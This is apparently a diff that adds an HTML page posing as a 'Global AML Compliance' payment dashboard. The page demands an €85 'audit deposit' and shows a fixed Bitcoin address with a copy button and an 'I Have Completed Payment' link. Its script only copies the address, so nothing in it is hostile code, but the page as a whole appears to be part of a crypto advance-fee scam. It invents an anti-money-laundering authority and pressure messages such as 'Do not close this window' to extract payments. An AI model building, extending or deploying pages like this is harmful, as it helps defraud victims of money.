@@ -1,0 +1,175 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+    <title>Secure Payment Dashboard - Global AML</title>
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Roboto+Mono:wght@400;500&display=swap");
+
+      *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+      :root {
+        --bg-primary: #f4f6f9; --bg-card: #ffffff; --text-primary: #0f172a;
+        --text-secondary: #64748b; --accent-blue: #2563eb; --border-color: #e2e8f0;
+        --accent-green: #16a34a;
+      }
+
+      html, body {
+        height: 100%; background: var(--bg-primary); font-family: "Inter", sans-serif;
+        color: var(--text-primary); display: flex; justify-content: center; align-items: flex-start;
+        min-height: 100vh;
+      }
+
+      .phone-frame { width: 100%; max-width: 420px; padding: 20px 16px 40px; display: flex; flex-direction: column; gap: 16px; }
+
+      /* HEADER */
+      .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px; }
+      .header-left { display: flex; align-items: center; gap: 12px; }
+      .back-btn { width: 36px; height: 36px; background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 10px; display: flex; align-items: center; justify-content: center; text-decoration: none; }
+      .back-btn svg { width: 18px; height: 18px; stroke: var(--text-primary); }
+      .header-title { font-size: 16px; font-weight: 700; color: var(--text-primary); }
+      
+      .status-badge { background: #fef2f2; border: 1px solid #fecaca; color: #dc2626; font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 20px; text-transform: uppercase; }
+
+      /* BALANCE CARD */
+      .balance-card {
+        background: var(--bg-card); border: 1px solid var(--border-color);
+        border-radius: 16px; padding: 24px; text-align: center;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.03);
+      }
+      .balance-label { font-size: 12px; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 8px; font-weight: 600; }
+      .balance-amount { font-size: 42px; font-weight: 800; color: var(--text-primary); margin-bottom: 4px; }
+      .balance-crypto { font-size: 14px; color: var(--accent-blue); font-weight: 600; }
+
+      /* DASHBOARD MENU */
+      .dashboard-menu { display: flex; flex-direction: column; gap: 10px; }
+      .menu-item { 
+        background: var(--bg-card); border: 1px solid var(--border-color); 
+        border-radius: 12px; padding: 16px; display: flex; align-items: center; justify-content: space-between;
+      }
+      .menu-left { display: flex; align-items: center; gap: 12px; }
+      .menu-icon { width: 40px; height: 40px; border-radius: 10px; background: #eff6ff; display: flex; align-items: center; justify-content: center; }
+      .menu-icon svg { width: 20px; height: 20px; stroke: var(--accent-blue); }
+      .menu-text { font-size: 14px; font-weight: 600; color: var(--text-primary); }
+      .menu-sub { font-size: 12px; color: var(--text-secondary); margin-top: 2px; }
+      
+      .menu-value { font-size: 15px; font-weight: 700; color: var(--accent-green); }
+
+      /* WALLET DETAILS CARD */
+      .wallet-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 16px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); }
+      .card-title { font-size: 13px; font-weight: 700; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; }
+      
+      .address-row {
+        display: flex; align-items: center; background: #f8fafc; border: 1px solid var(--border-color);
+        border-radius: 8px; padding: 10px 12px; margin-bottom: 12px;
+      }
+      .address-text { font-family: "Roboto Mono", monospace; font-size: 12px; color: var(--text-primary); word-break: break-all; flex: 1; font-weight: 500; }
+      .copy-btn {
+        background: var(--accent-blue); color: white; border: none; border-radius: 6px;
+        padding: 6px 12px; font-size: 11px; font-weight: 700; cursor: pointer; flex-shrink: 0; margin-left: 8px;
+      }
+
+      .warning-text { font-size: 11px; color: #dc2626; font-weight: 600; text-align: center; background: #fef2f2; padding: 8px; border-radius: 6px; }
+
+      /* ACTION BUTTON */
+      .btn-primary { 
+        width: 100%; background: var(--accent-blue); color: white; border: none; 
+        border-radius: 8px; padding: 16px; font-size: 15px; font-weight: 700; 
+        cursor: pointer; text-decoration: none; display: flex; justify-content: center; align-items: center; gap: 8px; 
+        margin-top: 10px; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2);
+      }
+      .btn-primary:hover { background: #1d4ed8; }
+
+      .footer-text { text-align: center; font-size: 10px; color: var(--text-secondary); margin-top: 10px; line-height: 1.5; }
+    </style>
+  </head>
+  <body>
+    <div class="phone-frame">
+      
+      <div class="header">
+        <div class="header-left">
+          <a href="invoice.html" class="back-btn">
+            <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
+          </a>
+          <div class="header-title">Payment Dashboard</div>
+        </div>
+        <div class="status-badge">Pending</div>
+      </div>
+
+      <!-- Main Balance Card -->
+      <div class="balance-card">
+        <div class="balance-label">Outstanding Clearance Balance</div>
+        <div class="balance-amount">€0.00</div>
+        <div class="balance-crypto">0.0000 ETH</div>
+      </div>
+
+      <!-- Dashboard Summary -->
+      <div class="dashboard-menu">
+        <div class="menu-item">
+          <div class="menu-left">
+            <div class="menu-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            </div>
+            <div>
+              <div class="menu-text">Total Audit Fee</div>
+              <div class="menu-sub">Cleared by Client</div>
+            </div>
+          </div>
+          <div class="menu-value">€0.00</div>
+        </div>
+
+        <div class="menu-item">
+          <div class="menu-left">
+            <div class="menu-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="7" width="20" height="14" rx="2" ry="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>
+            </div>
+            <div>
+              <div class="menu-text">Audit Deposit Required</div>
+              <div class="menu-sub">Initial Retainer Fee</div>
+            </div>
+          </div>
+          <div class="menu-value" style="color: var(--accent-blue);">€85.00</div>
+        </div>
+      </div>
+
+      <!-- Wallet Address Card -->
+      <div class="wallet-card">
+        <div class="card-title">Deposit Address (BTC)</div>
+        
+        <div class="address-row">
+          <div class="address-text" id="walletAddress">bc1qa733xj7w9jlvf6tsmstuywuwud5cphplyqwwnt</div>
+          <button class="copy-btn" onclick="copyAddress()">Copy</button>
+        </div>
+        
+        <div class="warning-text">Send only BTC to this address. Network: (BTC)</div>
+      </div>
+
+      <a href="final.html" class="btn-primary">
+        I Have Completed Payment
+      </a>
+
+      <div class="footer-text">
+        Secured by Global AML Compliance Network.<br>
+        Do not close this window during the transaction.
+      </div>
+
+    </div>
+
+    <script>
+      function copyAddress() {
+        const address = document.getElementById("walletAddress").innerText;
+        const btn = document.querySelector(".copy-btn");
+        
+        navigator.clipboard.writeText(address).then(() => {
+          btn.innerText = "Copied!";
+          btn.style.background = "#16a34a"; // Turn green
+          
+          setTimeout(() => {
+            btn.innerText = "Copy";
+            btn.style.background = "#2563eb"; // Back to blue
+          }, 2000);
+        });
+      }
+    </script>
+  </body>
+</html>
